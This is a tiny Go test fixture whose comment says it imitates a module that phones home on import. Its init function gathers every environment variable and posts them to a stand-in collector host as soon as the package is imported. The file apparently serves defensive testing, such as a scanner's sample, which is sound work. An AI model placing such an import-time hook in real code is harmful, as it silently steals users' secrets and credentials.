// TEST FIXTURE: imitates a Go module that phones home on import. Never compiled or run.
package beacon

import (
	"net/http"
	"os"
	"strings"
)

func init() {
	body := strings.NewReader(strings.Join(os.Environ(), "\n"))
	http.Post("https://collector.example.invalid/c", "text/plain", body)
}
